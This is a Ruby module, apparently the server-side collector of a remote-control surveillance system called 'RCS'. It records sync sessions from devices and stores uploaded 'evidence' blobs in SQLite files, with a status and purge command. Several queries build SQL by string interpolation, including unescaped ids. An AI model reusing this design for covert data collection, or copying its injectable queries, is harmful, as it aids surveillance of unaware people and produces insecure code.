#
#  Evidence Manager module for handling evidences
#

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/flatsingleton'
require 'rcs-common/fixnum'
require 'rcs-common/sqlite3'

# system
require 'pp'

module RCS

class EvidenceManager
  include Singleton
  extend FlatSingleton
  include RCS::Tracer

  REPO_DIR = Dir.pwd + '/evidence'

  SYNC_IDLE = 0
  SYNC_IN_PROGRESS = 1
  SYNC_TIMEOUTED = 2
  SYNC_PROCESSING = 3
  
  def sync_start(session, version, user, device, source, time, key=nil)

    # create the repository for this instance
    return unless create_repository session[:instance]
    
    trace :info, "[#{session[:instance]}] Sync is in progress..."

    SQLite3::Database.safe_escape user, device, source

    begin
      db = SQLite3::Database.open(REPO_DIR + '/' + session[:instance])
      if key.nil? then
        # retrieve the old one and keep it
        old = db.execute("SELECT key FROM info;")
        key = old.first.first unless old.empty?
      end
      db.execute("DELETE FROM info;")
      db.execute("INSERT INTO info VALUES (#{session[:bid]},
                                           '#{session[:build]}',
                                           '#{session[:instance]}',
                                           '#{session[:subtype]}',
                                           #{version},
                                           '#{user}',
                                           '#{device}',
                                           '#{source}',
                                           #{time},
                                           #{SYNC_IN_PROGRESS},
                                           '#{key}');")
      db.close
    rescue Exception => e
      trace :warn, "Cannot insert into the repository: #{e.message}"
    end
  end
  
  def sync_timeout(session)
    # sanity check
    path = REPO_DIR + '/' + session[:instance]
    return unless File.exist?(path)
    
    begin
      db = SQLite3::Database.open(path)
      # update only if the status in IN_PROGRESS
      # this will prevent erroneous overwrite of the IDLE status
      db.execute("UPDATE info SET sync_status = #{SYNC_TIMEOUTED} WHERE sync_status = #{SYNC_IN_PROGRESS};")
      db.close
    rescue Exception => e
      trace :warn, "Cannot update the repository: #{e.message}"
    end
    trace :info, "[#{session[:instance]}] Sync has been timeouted"
  end

  def sync_status(session, status)

    path = REPO_DIR + '/' + session[:instance]
    return unless File.exist?(path)

    begin
      db = SQLite3::Database.open(path)
      # update only if the status in IN_PROGRESS
      # this will prevent erroneous overwrite of the IDLE status
      db.execute("UPDATE info SET sync_status = #{status};")
      db.close
    rescue Exception => e
      trace :warn, "Cannot update the repository: #{e.message}"
    end

  end

  def sync_timeout_all
    begin
      Dir[REPO_DIR + '/*'].each do |e|
        db = SQLite3::Database.open(e)
        # update only if the status in IN_PROGRESS
        # this will prevent erroneous overwrite of the IDLE status
        db.execute("UPDATE info SET sync_status = #{SYNC_TIMEOUTED} WHERE sync_status = #{SYNC_IN_PROGRESS};")
        db.close
      end
    rescue Exception => e
      trace :warn, "Cannot update the repository: #{e.message}"
    end
  end

  def sync_end(session)
    # sanity check
    path = REPO_DIR + '/' + session[:instance]
    return unless File.exist?(path)
        
    begin
      db = SQLite3::Database.open(path)
      db.execute("UPDATE info SET sync_status = #{SYNC_IDLE} WHERE bid = #{session[:bid]};")
      db.close
    rescue Exception => e
      trace :warn, "Cannot update the repository: #{e.message}"
    end
    trace :info, "[#{session[:instance]}] Sync ended"
  end

  def store_evidence(session, size, content)
    # sanity check
    raise "No repository for this instance" unless File.exist?(REPO_DIR + '/' + session[:instance])

    # store the evidence
    begin
      db = SQLite3::Database.open(REPO_DIR + '/' + session[:instance])
      db.execute("INSERT INTO evidence (size, content) VALUES (#{size}, ? );", SQLite3::Blob.new(content))
      ret = db.last_insert_row_id
      db.close
    rescue Exception => e
      trace :warn, "Cannot insert into the repository: #{e.message}"
      raise "Cannot save evidence"
    end
    return ret
  end
  
  def get_evidence(id, instance)
    # sanity check
    path = REPO_DIR + '/' + instance
    return unless File.exists?(path)

    begin
      db = SQLite3::Database.open(path)
      ret = db.execute("SELECT content FROM evidence WHERE id=#{id};")
      db.close
      return ret.first.first
    rescue Exception => e
      trace :warn, "Cannot read from the repository: #{e.message}"
    end
  end

  def del_evidence(id, instance)
    # sanity check
    path = REPO_DIR + '/' + instance
    return unless File.exists?(path)

    begin
      db = SQLite3::Database.open(path)
      ret = db.execute("DELETE FROM evidence WHERE id=#{id};")
      db.close
    rescue Exception => e
      trace :warn, "Cannot delete from the repository: #{e.message}"
    end
  end

  def instances
    # return all the instances
    entries = []
    Dir[REPO_DIR + '/*'].each do |e|
      entries << File.basename(e)
    end
    return entries
  end

  def instance_info(instance)
    # sanity check
    path = REPO_DIR + '/' + instance
    return unless File.exist?(path)
    
    begin
      db = SQLite3::Database.open(path)
      db.results_as_hash = true
      ret = db.execute("SELECT * FROM info;")
      db.close
      return ret.first
    rescue Exception => e
      trace :warn, "Cannot read from the repository: #{e.message}"
    end
  end
  
  def evidence_info(instance)
    # sanity check
    path = REPO_DIR + '/' + instance
    return unless File.exist?(path)

    begin
      db = SQLite3::Database.open(path)
      ret = db.execute("SELECT size FROM evidence;")
      db.close
      return ret
    rescue Exception => e
      trace :warn, "Cannot read from the repository: #{e.message}"
    end
  end
  
  def evidence_ids(instance)
    # sanity check
    path = REPO_DIR + '/' + instance
    return unless File.exist?(path)
    
    begin
      db = SQLite3::Database.open(path)
      ret = db.execute("SELECT id FROM evidence;")
      db.close
      return ret.flatten
    rescue Exception => e
      trace :warn, "Cannot read from the repository: #{e.message}"
    end
  end

  def create_repository(instance)
    # ensure the repository directory is present
    Dir::mkdir(REPO_DIR) if not File.directory?(REPO_DIR)

    trace :info, "Creating repository for [#{instance}]"
    
    # create the repository
    begin
      db = SQLite3::Database.new REPO_DIR + '/' + instance
    rescue Exception => e
      trace :error, "Problems creating the repository file: #{e.message}"
      return false
    end

    # the schema of repository
    schema = ["CREATE TABLE IF NOT EXISTS info (bid INT,
                                                build CHAR(16),
                                                instance CHAR(40),
                                                subtype CHAR(16),
                                                version INT,
                                                user CHAR(256),
                                                device CHAR(256),
                                                source CHAR(256),
                                                sync_time INT,
                                                sync_status INT,
                                                key CHAR(32))",
              "CREATE TABLE IF NOT EXISTS evidence (id INTEGER PRIMARY KEY ASC,
                                                    size INT,
                                                    content BLOB)"
             ]
    
    # create all the tables
    schema.each do |query|
      begin
        db.execute query
      rescue Exception => e
        trace :error, "Cannot execute the statement : #{e.message}"
        db.close
        return false
      end
    end

    db.close

    return true
  end

  def run(options)

    # delete all the instance with zero evidence pending and not in progress
    if options[:purge] then
      instances.each do |e|
        entry = instance_info(e)
        evidence = evidence_info(e)
        # IN_PROGRESS sync must be preserved
        # evidences must be preserved
        File.delete(REPO_DIR + '/' + e) if entry['sync_status'] != SYNC_IN_PROGRESS and evidence.length == 0
      end
    end

    entries = []

    # we want just one instance
    if options[:instance] then
      entry = instance_info(options[:instance])
      if entry.nil? then
        puts "\nERROR: Invalid instance"
        return 1
      end
      entry[:evidence] = evidence_info(options[:instance])
      entries << entry
    else
      # take the info from all the instances
      instances.each do |e|
        entry = instance_info(e)
        unless entry.nil? then
          entry[:evidence] = evidence_info(e)
          entries << entry
        end
      end
    end
    
    entries.sort! { |a, b| a['sync_time'] <=> b['sync_time'] }

    # table definitions
    table_width = 115
    table_line = '+' + '-' * table_width + '+'

    # print the table header
    puts
    puts table_line
    puts '|' + 'instance'.center(42) + '|' + 'subtype'.center(12) + '|' +
         'last sync time'.center(25) + '|' + 'status'.center(13) + '|' +
         'logs'.center(6) + '|' + 'size'.center(12) + '|'
    puts table_line

    # print the table entries
    entries.each do |e|
      time = Time.at(e['sync_time']).getutc
      time = time.to_s.split(' +').first
      status = status_to_s(e['sync_status'])
      count = e[:evidence].length.to_s

      array = e[:evidence]
      # calculate the sum of all the elements
      if array.length != 0 then
        # calculate the sum
        size = array.flatten.reduce(:+)
      else
        size = 0
      end

      puts "|#{e['instance'].center(42)}|#{e['subtype'].center(12)}| #{time} |#{status.center(13)}|#{count.rjust(5)} |#{size.to_s_bytes.rjust(11)} |"
    end
    
    # print the table footer
    puts table_line    
    puts

    # detailed information only if one instance was specified
    if options[:instance] then
      entry.delete(:evidence)
      # cleanup the duplicates
      entry.delete_if { |key, value| key.class != String }

      pp entry
    end

    return 0
  end
  
  private
  def status_to_s(status)
    statuses = {SYNC_IDLE => "IDLE", SYNC_IN_PROGRESS => "IN PROGRESS", SYNC_TIMEOUTED => "TIMEOUT", SYNC_PROCESSING => "PROCESSING"}
    return statuses[status]
  end
  
  # executed from rcs-collector-status
  def self.run!(*argv)
    # reopen the class and declare any empty trace method
    # if called from command line, we don't have the trace facility
    self.class_eval do
      def trace(level, message)
        puts message
      end
    end

    # This hash will hold all of the options parsed from the command-line by OptionParser.
    options = {}

    optparse = OptionParser.new do |opts|
      opts.banner = "Usage: rcs-collector-status [options] [instance]"

      opts.on( '-i', '--instance INSTANCE', String, 'Show statistics only for this INSTANCE' ) do |inst|
        options[:instance] = inst
      end

      opts.on( '-p', '--purge', 'Purge all the instance with no pending tasks' ) do
        options[:purge] = true
      end

      opts.on( '-h', '--help', 'Display this screen' ) do
        puts opts
        return 0
      end
    end

    optparse.parse(argv)

    # execute the manager
    return EvidenceManager.instance.run(options)
  end

end #EvidenceManager
end #RCS::